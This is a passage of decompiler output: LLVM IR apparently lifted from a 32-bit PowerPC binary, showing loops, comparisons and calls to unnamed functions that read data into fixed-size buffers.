  %v2_100012e0 = add i32 %v0_100012e0, %v3_100012d4
  store i32 %v2_100012e0, i32* %r4.global-to-local, align 4
  store i32 268440296, i32* @lr, align 4
  %v4_100012e4 = call i32 @function_10008a08(i32 %v3_100012d8, i32 %v2_100012e0, i32 %v1_100012dc, i32 16384)
  store i32 %v4_100012e4, i32* %r3.global-to-local, align 4
  %v3_100012e8 = icmp eq i32 %v4_100012e4, 0
  br i1 %v3_100012e8, label %dec_label_pc_1000140c, label %dec_label_pc_100012f0

dec_label_pc_100012f0:                            ; preds = %dec_label_pc_100013c8, %dec_label_pc_100012c8
  %v1_10001308 = phi i32 [ %v4_10001400, %dec_label_pc_100013c8 ], [ %v4_100012e4, %dec_label_pc_100012c8 ]
  %v1_100012f0 = icmp slt i32 %v1_10001308, -1
  %v2_100012f0 = icmp sgt i32 %v1_10001308, -1
  %v3_100012f0 = icmp eq i32 %v1_10001308, -1
  store i1 %v1_100012f0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_100012f0, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_100012f0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100012f0, label %dec_label_pc_100017ec, label %dec_label_pc_100012f8

dec_label_pc_100012f8:                            ; preds = %dec_label_pc_100012f0
  %v0_100012f8 = load i32, i32* @r30, align 4
  %v1_100012f8 = add i32 %v0_100012f8, 1579
  %v2_100012f8 = inttoptr i32 %v1_100012f8 to i32*
  %v3_100012f8 = load i32, i32* %v2_100012f8, align 4
  store i32 %v3_100012f8, i32* %r29.global-to-local, align 4
  %v0_100012fc = load i32, i32* %r15.global-to-local, align 4
  store i32 %v0_100012fc, i32* %r24.global-to-local, align 4
  %v0_10001300 = load i32, i32* @r1, align 4
  %v1_10001300 = add i32 %v0_10001300, 20792
  %v2_10001300 = inttoptr i32 %v1_10001300 to i32*
  %v3_10001300 = load i32, i32* %v2_10001300, align 4
  store i32 %v3_10001300, i32* %r0.global-to-local, align 4
  %v0_10001304 = load i32, i32* %r14.global-to-local, align 4
  store i32 %v0_10001304, i32* %r17.global-to-local, align 4
  %v2_10001308 = add i32 %v3_100012f8, %v1_10001308
  store i32 %v2_10001308, i32* %r29.global-to-local, align 4
  %v2_1000130c = add i32 %v0_100012f8, -525
  %v3_1000130c = inttoptr i32 %v2_1000130c to i32*
  store i32 %v3_10001300, i32* %v3_1000130c, align 4
  %v0_10001310 = load i32, i32* %r29.global-to-local, align 4
  %v1_10001310 = load i32, i32* @r30, align 4
  %v2_10001310 = add i32 %v1_10001310, 1579
  %v3_10001310 = inttoptr i32 %v2_10001310 to i32*
  store i32 %v0_10001310, i32* %v3_10001310, align 4
  br label %dec_label_pc_1000139c

dec_label_pc_10001318:                            ; preds = %dec_label_pc_1000139c
  %v1_10001318 = load i32, i32* %r29.global-to-local, align 4
  %v3_10001318 = icmp sgt i32 %v3_1000139c, %v1_10001318
  %v1_10001318.v3_1000139c = select i1 %v3_10001318, i32 %v1_10001318, i32 %v3_1000139c
  store i32 %v1_10001318.v3_1000139c, i32* %r28.global-to-local, align 4
  %v1_10001328 = add i32 %v0_1000139c, 919
  %v2_10001328 = inttoptr i32 %v1_10001328 to i32*
  %v3_10001328 = load i32, i32* %v2_10001328, align 4
  store i32 %v3_10001328, i32* %r0.global-to-local, align 4
  %v2_1000132c = sub i32 %v3_1000139c, %v1_10001318.v3_1000139c
  store i32 %v2_1000132c, i32* @r31, align 4
  store i32 %v2_1000132c, i32* %v2_1000139c, align 4
  %v0_10001334 = load i32, i32* %r0.global-to-local, align 4
  %v1_10001334 = icmp slt i32 %v0_10001334, 1
  %v2_10001334 = icmp sgt i32 %v0_10001334, 1
  %v3_10001334 = icmp eq i32 %v0_10001334, 1
  store i1 %v1_10001334, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001334, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001334, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001334, label %dec_label_pc_1000142c, label %dec_label_pc_10001328.dec_label_pc_1000133cthread-pre-split_crit_edge

dec_label_pc_10001328.dec_label_pc_1000133cthread-pre-split_crit_edge: ; preds = %dec_label_pc_10001318
  %v0_1000133c.pr.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000133c

dec_label_pc_1000133c:                            ; preds = %dec_label_pc_100013a8, %dec_label_pc_10001328.dec_label_pc_1000133cthread-pre-split_crit_edge, %dec_label_pc_10001454
  %v0_1000133c = phi i32 [ %v3_10001454, %dec_label_pc_10001454 ], [ %v0_1000133c.pr.pre, %dec_label_pc_10001328.dec_label_pc_1000133cthread-pre-split_crit_edge ], [ %v3_1000139c, %dec_label_pc_100013a8 ]
  %v1_1000133c = icmp slt i32 %v0_1000133c, 0
  %v2_1000133c = icmp sgt i32 %v0_1000133c, 0
  %v3_1000133c = icmp eq i32 %v0_1000133c, 0
  store i1 %v1_1000133c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_1000133c, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_1000133c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000133c, label %dec_label_pc_10001344, label %dec_label_pc_10001364

dec_label_pc_10001344:                            ; preds = %dec_label_pc_1000133c
  %v0_10001344 = load i32, i32* @r30, align 4
  %v1_10001344 = add i32 %v0_10001344, 927
  %v2_10001344 = inttoptr i32 %v1_10001344 to i32*
  %v3_10001344 = load i32, i32* %v2_10001344, align 4
  store i32 %v3_10001344, i32* %r29.global-to-local, align 4
  %v1_10001348 = icmp slt i32 %v3_10001344, 1
  %v2_10001348 = icmp sgt i32 %v3_10001344, 1
  %v3_10001348 = icmp eq i32 %v3_10001344, 1
  store i1 %v1_10001348, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001348, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001348, i1* %cr7_eq.global-to-local, align 1
  %v1_1000145c = add i32 %v0_10001344, 1579
  %v2_1000145c = inttoptr i32 %v1_1000145c to i32*
  %v3_1000145c = load i32, i32* %v2_1000145c, align 4
  br i1 %v3_10001348, label %dec_label_pc_1000145c, label %dec_label_pc_10001350

dec_label_pc_10001350:                            ; preds = %dec_label_pc_10001344
  %v0_10001354 = load i32, i32* %r28.global-to-local, align 4
  %v2_10001354 = sub i32 %v3_1000145c, %v0_10001354
  store i32 %v2_10001354, i32* %r0.global-to-local, align 4
  %v1_10001358 = icmp slt i32 %v2_10001354, 0
  %v2_10001358 = icmp sgt i32 %v2_10001354, 0
  %v3_10001358 = icmp eq i32 %v2_10001354, 0
  store i1 %v1_10001358, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001358, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001358, i1* %cr7_eq.global-to-local, align 1
  %v2_1000135c = add i32 %v0_10001344, 931
  %v3_1000135c = inttoptr i32 %v2_1000135c to i32*
  store i32 %v2_10001354, i32* %v3_1000135c, align 4
  br i1 %v3_10001358, label %dec_label_pc_100011e4, label %dec_label_pc_10001364

dec_label_pc_10001364:                            ; preds = %dec_label_pc_1000133c, %dec_label_pc_1000145c, %dec_label_pc_10001350, %dec_label_pc_100014e4
  %v0_10001364 = load i32, i32* %r28.global-to-local, align 4
  %v1_10001364 = icmp slt i32 %v0_10001364, 0
  %v2_10001364 = icmp sgt i32 %v0_10001364, 0
  %v3_10001364 = icmp eq i32 %v0_10001364, 0
  store i1 %v1_10001364, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001364, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001364, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001364, label %dec_label_pc_100013b0, label %dec_label_pc_1000136c

dec_label_pc_1000136c:                            ; preds = %dec_label_pc_10001364
  %v0_1000136c = load i32, i32* @r30, align 4
  %v1_1000136c = add i32 %v0_1000136c, 1579
  %v2_1000136c = inttoptr i32 %v1_1000136c to i32*
  %v3_1000136c = load i32, i32* %v2_1000136c, align 4
  store i32 %v3_1000136c, i32* %r0.global-to-local, align 4
  %v0_10001370 = load i32, i32* %r27.global-to-local, align 4
  %v2_10001370 = add i32 %v0_10001370, %v0_10001364
  store i32 %v2_10001370, i32* %r4.global-to-local, align 4
  store i32 %v0_10001370, i32* %r3.global-to-local, align 4
  %v2_10001378 = sub i32 %v3_1000136c, %v0_10001364
  store i32 %v2_10001378, i32* %r29.global-to-local, align 4
  store i32 %v2_10001378, i32* %v2_1000136c, align 4
  %v0_10001380 = load i32, i32* %r29.global-to-local, align 4
  store i32 268440456, i32* @lr, align 4
  %v3_10001384 = call i32 @function_10008564(i32 %v0_10001370, i32 %v2_10001370, i32 %v0_10001380)
  store i32 %v3_10001384, i32* %r3.global-to-local, align 4
  %v0_10001388 = load i32, i32* @r30, align 4
  %v1_10001388 = add i32 %v0_10001388, 1579
  %v2_10001388 = inttoptr i32 %v1_10001388 to i32*
  %v3_10001388 = load i32, i32* %v2_10001388, align 4
  store i32 %v3_10001388, i32* %r29.global-to-local, align 4
  %v1_1000138c = icmp slt i32 %v3_10001388, 0
  %v2_1000138c = icmp sgt i32 %v3_10001388, 0
  %v3_1000138c = icmp eq i32 %v3_10001388, 0
  store i1 %v1_1000138c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_1000138c, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_1000138c, i1* %cr7_eq.global-to-local, align 1
  %v1_10001390 = load i32, i32* %r23.global-to-local, align 4
  %v2_10001390 = add i32 %v1_10001390, %v3_10001388
  store i32 %v2_10001390, i32* %r9.global-to-local, align 4
  %v0_10001394 = load i32, i32* %r26.global-to-local, align 4
  %v1_10001394 = trunc i32 %v0_10001394 to i8
  %v3_10001394 = add i32 %v2_10001390, 2116
  %v4_10001394 = inttoptr i32 %v3_10001394 to i8*
  store i8 %v1_10001394, i8* %v4_10001394, align 1
  %v0_10001398 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10001398, label %dec_label_pc_100013b0, label %dec_label_pc_1000139c

dec_label_pc_1000139c:                            ; preds = %dec_label_pc_1000136c, %dec_label_pc_100012f8
  %v0_1000139c = load i32, i32* @r30, align 4
  %v1_1000139c = add i32 %v0_1000139c, 931
  %v2_1000139c = inttoptr i32 %v1_1000139c to i32*
  %v3_1000139c = load i32, i32* %v2_1000139c, align 4
  store i32 %v3_1000139c, i32* @r31, align 4
  %v1_100013a0 = icmp slt i32 %v3_1000139c, 0
  %v2_100013a0 = icmp sgt i32 %v3_1000139c, 0
  %v3_100013a0 = icmp eq i32 %v3_1000139c, 0
  store i1 %v1_100013a0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_100013a0, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_100013a0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_100013a0, label %dec_label_pc_10001318, label %dec_label_pc_100013a8

dec_label_pc_100013a8:                            ; preds = %dec_label_pc_1000139c
  store i32 0, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1000133c

dec_label_pc_100013b0:                            ; preds = %dec_label_pc_1000136c, %dec_label_pc_10001364
  %v0_100013b0 = load i32, i32* @r30, align 4
  %v1_100013b0 = add i32 %v0_100013b0, -529
  %v2_100013b0 = inttoptr i32 %v1_100013b0 to i8*
  %v3_100013b0 = load i8, i8* %v2_100013b0, align 1
  %v4_100013b0 = zext i8 %v3_100013b0 to i32
  store i32 %v4_100013b0, i32* %r0.global-to-local, align 4
  %v1_100013b4 = icmp ult i8 %v3_100013b0, 7
  %v2_100013b4 = icmp ugt i8 %v3_100013b0, 7
  %v3_100013b4 = icmp eq i8 %v3_100013b0, 7
  store i1 %v1_100013b4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_100013b4, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_100013b4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100013b4, label %dec_label_pc_100013bc, label %dec_label_pc_10000824

dec_label_pc_100013bc:                            ; preds = %dec_label_pc_100013b0
  %v1_100013bc = add i32 %v0_100013b0, 1579
  %v2_100013bc = inttoptr i32 %v1_100013bc to i32*
  %v3_100013bc = load i32, i32* %v2_100013bc, align 4
  store i32 %v3_100013bc, i32* %r0.global-to-local, align 4
  %v1_100013c0 = icmp slt i32 %v3_100013bc, 1024
  %v2_100013c0 = icmp sgt i32 %v3_100013bc, 1024
  %v3_100013c0 = icmp eq i32 %v3_100013bc, 1024
  store i1 %v1_100013c0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_100013c0, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_100013c0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100013c0, label %dec_label_pc_100013bc.dec_label_pc_100013c8_crit_edge, label %dec_label_pc_100013bc.dec_label_pc_100012c8_crit_edge

dec_label_pc_100013bc.dec_label_pc_100012c8_crit_edge: ; preds = %dec_label_pc_100013bc
  %v1_100012d0.pre = load i32, i32* %r25.global-to-local, align 4
  br label %dec_label_pc_100012c8

dec_label_pc_100013bc.dec_label_pc_100013c8_crit_edge: ; preds = %dec_label_pc_100013bc
  %v0_100013c8.pre = load i32, i32* %r23.global-to-local, align 4
  %v0_100013d0.pre = load i32, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_100013c8

dec_label_pc_100013c8:                            ; preds = %dec_label_pc_100013bc.dec_label_pc_100013c8_crit_edge, %dec_label_pc_10001294
  %v0_100013d0 = phi i32 [ %v0_100013d0.pre, %dec_label_pc_100013bc.dec_label_pc_100013c8_crit_edge ], [ %v1_100012bc, %dec_label_pc_10001294 ]
  %v0_100013c8 = phi i32 [ %v0_100013c8.pre, %dec_label_pc_100013bc.dec_label_pc_100013c8_crit_edge ], [ %v0_100012bc, %dec_label_pc_10001294 ]
  %v1_100013c8 = add i32 %v0_100013c8, 2180
  store i32 %v1_100013c8, i32* %r4.global-to-local, align 4
  store i32 %v0_100013d0, i32* %r3.global-to-local, align 4
  store i32 268440536, i32* @lr, align 4
  %v3_100013d4 = call i32 @function_10008564(i32 %v0_100013d0, i32 %v1_100013c8, i32 960)
  store i32 %v3_100013d4, i32* %r3.global-to-local, align 4
  %v0_100013d8 = load i32, i32* @r30, align 4
  %v1_100013d8 = add i32 %v0_100013d8, 1579
  %v2_100013d8 = inttoptr i32 %v1_100013d8 to i32*
  %v3_100013d8 = load i32, i32* %v2_100013d8, align 4
  store i32 %v3_100013d8, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_100013e4 = add i32 %v3_100013d8, -64
  store i32 %v1_100013e4, i32* %r29.global-to-local, align 4
  store i32 %v1_100013e4, i32* %v2_100013d8, align 4
  %v0_100013ec = load i32, i32* %r0.global-to-local, align 4
  %v1_100013ec = load i32, i32* %r25.global-to-local, align 4
  %v2_100013ec = inttoptr i32 %v1_100013ec to i32*
  store i32 %v0_100013ec, i32* %v2_100013ec, align 4
  %v0_100013f0 = load i32, i32* @r30, align 4
  %v1_100013f0 = add i32 %v0_100013f0, 1579
  %v2_100013f0 = inttoptr i32 %v1_100013f0 to i32*
  %v3_100013f0 = load i32, i32* %v2_100013f0, align 4
  store i32 %v3_100013f0, i32* %r4.global-to-local, align 4
  %v1_100013f4 = add i32 %v0_100013f0, -533
  %v2_100013f4 = inttoptr i32 %v1_100013f4 to i32*
  %v3_100013f4 = load i32, i32* %v2_100013f4, align 4
  store i32 %v3_100013f4, i32* %r3.global-to-local, align 4
  %v1_100013f8 = sub i32 1024, %v3_100013f0
  %v0_100013fc = load i32, i32* %r27.global-to-local, align 4
  %v2_100013fc = add i32 %v0_100013fc, %v3_100013f0
  store i32 %v2_100013fc, i32* %r4.global-to-local, align 4
  store i32 268440580, i32* @lr, align 4
  %v4_10001400 = call i32 @function_10008a08(i32 %v3_100013f4, i32 %v2_100013fc, i32 %v1_100013f8, i32 16384)
  store i32 %v4_10001400, i32* %r3.global-to-local, align 4
  %v3_10001404 = icmp eq i32 %v4_10001400, 0
  br i1 %v3_10001404, label %dec_label_pc_1000140c, label %dec_label_pc_100012f0

dec_label_pc_1000140c:                            ; preds = %dec_label_pc_100013c8, %dec_label_pc_100012c8
  store i32 104, i32* %r0.global-to-local, align 4
  %v1_10001410 = load i32, i32* %r25.global-to-local, align 4
  %v2_10001410 = inttoptr i32 %v1_10001410 to i32*
  store i32 104, i32* %v2_10001410, align 4
  br label %dec_label_pc_10001414

dec_label_pc_10001414:                            ; preds = %dec_label_pc_100017ec, %dec_label_pc_1000140c
  %v0_10001414 = load i32, i32* @r30, align 4
  %v1_10001414 = add i32 %v0_10001414, -533
  %v2_10001414 = inttoptr i32 %v1_10001414 to i32*
  %v3_10001414 = load i32, i32* %v2_10001414, align 4
  store i32 %v3_10001414, i32* %r3.global-to-local, align 4
  store i32 268440604, i32* @lr, align 4
  %v0_10001418 = call i32 @function_10007d68()
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_10001420 = load i32, i32* @r30, align 4
  %v2_10001420 = add i32 %v1_10001420, -533
  %v3_10001420 = inttoptr i32 %v2_10001420 to i32*
  store i32 -1, i32* %v3_10001420, align 4
  %v0_10001424 = load i32, i32* %r26.global-to-local, align 4
  %v1_10001424 = trunc i32 %v0_10001424 to i8
  %v2_10001424 = load i32, i32* @r30, align 4
  %v3_10001424 = add i32 %v2_10001424, -529
  %v4_10001424 = inttoptr i32 %v3_10001424 to i8*
  store i8 %v1_10001424, i8* %v4_10001424, align 1
  br label %dec_label_pc_10000824

dec_label_pc_1000142c:                            ; preds = %dec_label_pc_10001318
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 268440632, i32* %lr.global-to-local, align 4
  %v3_10001434 = call i32 @function_10006bb0(i32 36, i32* null)
  %v0_10001438 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10001438, i32* %r4.global-to-local, align 4
  %v0_10001444 = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_10001444, i32* %r3.global-to-local, align 4
  store i32 268440652, i32* %lr.global-to-local, align 4
  %v4_10001448 = call i32 @function_100075a8(i32 %v0_10001444, i32 %v0_10001438, i32 %v3_10001434, i32 11)
  store i32 %v4_10001448, i32* %r3.global-to-local, align 4
  %v1_1000144c = icmp slt i32 %v4_10001448, -1
  %v2_1000144c = icmp sgt i32 %v4_10001448, -1
  %v3_1000144c = icmp eq i32 %v4_10001448, -1
  store i1 %v1_1000144c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_1000144c, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_1000144c, i1* %cr7_eq.global-to-local, align 1
  %v0_10001454 = load i32, i32* @r30, align 4
  br i1 %v3_1000144c, label %dec_label_pc_10001454, label %dec_label_pc_10001948

dec_label_pc_10001454:                            ; preds = %dec_label_pc_1000142c
  %v1_10001454 = add i32 %v0_10001454, 931
  %v2_10001454 = inttoptr i32 %v1_10001454 to i32*
  %v3_10001454 = load i32, i32* %v2_10001454, align 4
  store i32 %v3_10001454, i32* @r31, align 4
  br label %dec_label_pc_1000133c

dec_label_pc_1000145c:                            ; preds = %dec_label_pc_10001344
  store i32 %v3_1000145c, i32* %r4.global-to-local, align 4
  %v0_10001460 = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_10001460, i32* %r3.global-to-local, align 4
  %v0_10001464 = load i32, i32* %r24.global-to-local, align 4
  store i32 268440688, i32* %lr.global-to-local, align 4
  %v5_1000146c = call i32 @function_100075a8(i32 %v0_10001460, i32 %v3_1000145c, i32 %v0_10001464, i32 2)
  store i32 %v5_1000146c, i32* %r3.global-to-local, align 4
  %v1_10001470 = icmp slt i32 %v5_1000146c, -1
  %v2_10001470 = icmp sgt i32 %v5_1000146c, -1
  %v3_10001470 = icmp eq i32 %v5_1000146c, -1
  store i1 %v1_10001470, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001470, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001470, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001470, label %dec_label_pc_10001364, label %dec_label_pc_10001478

dec_label_pc_10001478:                            ; preds = %dec_label_pc_1000145c
  %v0_10001478 = load i32, i32* @r30, align 4
  %v1_10001478 = add i32 %v0_10001478, 1579
  %v2_10001478 = inttoptr i32 %v1_10001478 to i32*
  %v3_10001478 = load i32, i32* %v2_10001478, align 4
  store i32 %v3_10001478, i32* %r4.global-to-local, align 4
  %v0_1000147c = load i32, i32* %r24.global-to-local, align 4
  %v0_10001484 = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_10001484, i32* %r3.global-to-local, align 4
  store i32 268440716, i32* %lr.global-to-local, align 4
  %v5_10001488 = call i32 @function_100075a8(i32 %v0_10001484, i32 %v3_10001478, i32 %v0_1000147c, i32 2)
  %v0_1000148c = load i32, i32* %r17.global-to-local, align 4
  %v1_10001490 = load i32, i32* %r23.global-to-local, align 4
  %v2_10001490 = add i32 %v1_10001490, %v5_10001488
  store i32 %v2_10001490, i32* %r9.global-to-local, align 4
  store i32 %v5_10001488, i32* %r28.global-to-local, align 4
  %v0_10001498 = load i32, i32* @r31, align 4
  %v1_10001498 = trunc i32 %v0_10001498 to i8
  %v3_10001498 = add i32 %v2_10001490, 2114
  %v4_10001498 = inttoptr i32 %v3_10001498 to i8*
  store i8 %v1_10001498, i8* %v4_10001498, align 1
  %v0_1000149c = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_1000149c, i32* %r3.global-to-local, align 4
  %v0_100014a0 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_100014a0, i32* %r4.global-to-local, align 4
  store i32 268440748, i32* %lr.global-to-local, align 4
  %v4_100014a8 = call i32 @function_100075a8(i32 %v0_1000149c, i32 %v0_100014a0, i32 %v0_1000148c, i32 1)
  store i32 %v4_100014a8, i32* %r3.global-to-local, align 4
  %v1_100014ac = icmp slt i32 %v4_100014a8, -1
  %v2_100014ac = icmp sgt i32 %v4_100014a8, -1
  %v3_100014ac = icmp eq i32 %v4_100014a8, -1
  store i1 %v1_100014ac, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_100014ac, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_100014ac, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100014ac, label %dec_label_pc_100014d0, label %dec_label_pc_100014b4

dec_label_pc_100014b4:                            ; preds = %dec_label_pc_10001478
  %v0_100014b4 = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_100014b4, i32* %r3.global-to-local, align 4
  %v0_100014b8 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_100014b8, i32* %r4.global-to-local, align 4
  %v0_100014bc = load i32, i32* %r17.global-to-local, align 4
  store i32 268440776, i32* %lr.global-to-local, align 4
  %v4_100014c4 = call i32 @function_100075a8(i32 %v0_100014b4, i32 %v0_100014b8, i32 %v0_100014bc, i32 1)
  %v1_100014c8 = load i32, i32* %r23.global-to-local, align 4
  %v2_100014c8 = add i32 %v1_100014c8, %v4_100014c4
  store i32 %v2_100014c8, i32* %r3.global-to-local, align 4
  %v0_100014cc = load i32, i32* @r31, align 4
  %v1_100014cc = trunc i32 %v0_100014cc to i8
  %v3_100014cc = add i32 %v2_100014c8, 2116
  %v4_100014cc = inttoptr i32 %v3_100014cc to i8*
  store i8 %v1_100014cc, i8* %v4_100014cc, align 1
  br label %dec_label_pc_100014d0

dec_label_pc_100014d0:                            ; preds = %dec_label_pc_10001478, %dec_label_pc_100014b4
  %v0_100014d0 = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_100014d0, i32* @r3, align 4
  store i32 16, i32* %r4.global-to-local, align 4
  store i32 268440796, i32* @lr, align 4
  %v2_100014d8 = call i32 @function_10007604(i32 %v0_100014d0, i32 16)
  store i32 %v2_100014d8, i32* %r3.global-to-local, align 4
  %v3_100014dc = icmp eq i32 %v2_100014d8, 0
  br i1 %v3_100014dc, label %dec_label_pc_10001b70, label %dec_label_pc_100014e4

dec_label_pc_100014e4:                            ; preds = %dec_label_pc_100014d0
  %v1_100014e4 = add i32 %v2_100014d8, 2
  %v1_100014e8 = load i32, i32* @r30, align 4
  %v2_100014e8 = add i32 %v1_100014e8, 931
  %v3_100014e8 = inttoptr i32 %v2_100014e8 to i32*
  store i32 %v1_100014e4, i32* %v3_100014e8, align 4
  br label %dec_label_pc_10001364

dec_label_pc_100014f0:                            ; preds = %dec_label_pc_10000860
  store i32 ptrtoint (i32* @global_var_100014f8.41 to i32), i32* @lr, align 4
  %v0_100014f4 = call i32 @function_10007d68()
  store i32 %v0_100014f4, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v0_100014fc = load i32, i32* %r29.global-to-local, align 4
  %v1_100014fc = trunc i32 %v0_100014fc to i8
  %v2_100014fc = load i32, i32* @r30, align 4
  %v3_100014fc = add i32 %v2_100014fc, -529
  %v4_100014fc = inttoptr i32 %v3_100014fc to i8*
  store i8 %v1_100014fc, i8* %v4_100014fc, align 1
  %v0_10001500 = load i32, i32* %r0.global-to-local, align 4
  %v1_10001500 = load i32, i32* @r30, align 4
  %v2_10001500 = add i32 %v1_10001500, -533
  %v3_10001500 = inttoptr i32 %v2_10001500 to i32*
  store i32 %v0_10001500, i32* %v3_10001500, align 4
  br label %dec_label_pc_10000824

dec_label_pc_10001508:                            ; preds = %dec_label_pc_10000be8
  %v0_10001508 = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_10001508, i32* @r3, align 4
  %v0_1000150c = load i32, i32* @r31, align 4
  store i32 %v0_1000150c, i32* %r4.global-to-local, align 4
  store i32 268440852, i32* %lr.global-to-local, align 4
  %v2_10001510 = inttoptr i32 %v0_10001508 to i8*
  %v3_10001510 = call i32 @function_10007504(i8* %v2_10001510, i32 %v0_1000150c)
  store i32 %v3_10001510, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10000c00

dec_label_pc_10001518:                            ; preds = %dec_label_pc_1000081c
  store i32 268440860, i32* %lr.global-to-local, align 4
  %v0_10001518 = call i32 @function_10008484()
  store i32 %v0_10001518, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %v0_10001518, i32* @r31, align 4
  br label %dec_label_pc_10001524

dec_label_pc_10001524:                            ; preds = %dec_label_pc_10001544.dec_label_pc_10001524_crit_edge, %dec_label_pc_10001518
  %v1_10001524 = phi i32 [ %v1_10001524.pre, %dec_label_pc_10001544.dec_label_pc_10001524_crit_edge ], [ %v0_10001518, %dec_label_pc_10001518 ]
  %v0_10001524 = phi i32 [ %v0_10001524.pre, %dec_label_pc_10001544.dec_label_pc_10001524_crit_edge ], [ 0, %dec_label_pc_10001518 ]
  %v2_10001524 = inttoptr i32 %v1_10001524 to i32*
  store i32 %v0_10001524, i32* %v2_10001524, align 4
  %v0_10001528 = load i32, i32* %r20.global-to-local, align 4
  store i32 %v0_10001528, i32* %r4.global-to-local, align 4
  %v0_10001534 = load i32, i32* @r30, align 4
  %v1_10001534 = add i32 %v0_10001534, -533
  %v2_10001534 = inttoptr i32 %v1_10001534 to i32*
  %v3_10001534 = load i32, i32* %v2_10001534, align 4
  store i32 %v3_10001534, i32* %r3.global-to-local, align 4
  store i32 268440892, i32* @lr, align 4
  %v4_10001538 = call i32 @function_10008a08(i32 %v3_10001534, i32 %v0_10001528, i32 10240, i32 16384)
  store i32 %v4_10001538, i32* %r3.global-to-local, align 4
  %v3_1000153c = icmp eq i32 %v4_10001538, 0
  br i1 %v3_1000153c, label %dec_label_pc_100017e0, label %dec_label_pc_10001544

dec_label_pc_10001544:                            ; preds = %dec_label_pc_10001524
  %v1_10001544 = icmp slt i32 %v4_10001538, -1
  %v2_10001544 = icmp sgt i32 %v4_10001538, -1
  %v3_10001544 = icmp eq i32 %v4_10001538, -1
  store i1 %v1_10001544, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001544, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001544, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001544, label %dec_label_pc_1000154c, label %dec_label_pc_10001544.dec_label_pc_10001524_crit_edge

dec_label_pc_10001544.dec_label_pc_10001524_crit_edge: ; preds = %dec_label_pc_10001544
  %v0_10001524.pre = load i32, i32* %r29.global-to-local, align 4
  %v1_10001524.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10001524

dec_label_pc_1000154c:                            ; preds = %dec_label_pc_10001544
  %v0_1000154c = load i32, i32* @r31, align 4
  %v1_1000154c = inttoptr i32 %v0_1000154c to i32*
  %v2_1000154c = load i32, i32* %v1_1000154c, align 4
  store i32 %v2_1000154c, i32* %r0.global-to-local, align 4
  %v1_10001550 = icmp slt i32 %v2_1000154c, 11
  %v2_10001550 = icmp sgt i32 %v2_1000154c, 11
  %v3_10001550 = icmp eq i32 %v2_1000154c, 11
  store i1 %v1_10001550, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001550, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001550, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001550, label %dec_label_pc_1000190c, label %dec_label_pc_10001558

dec_label_pc_10001558:                            ; preds = %dec_label_pc_1000154c, %dec_label_pc_100017e0
  %v0_10001558 = load i32, i32* @r30, align 4
  %v1_10001558 = add i32 %v0_10001558, -533
  %v2_10001558 = inttoptr i32 %v1_10001558 to i32*
  %v3_10001558 = load i32, i32* %v2_10001558, align 4
  store i32 %v3_10001558, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10001560.42 to i32), i32* @lr, align 4
  %v0_1000155c = call i32 @function_10007d68()
  store i32 %v0_1000155c, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
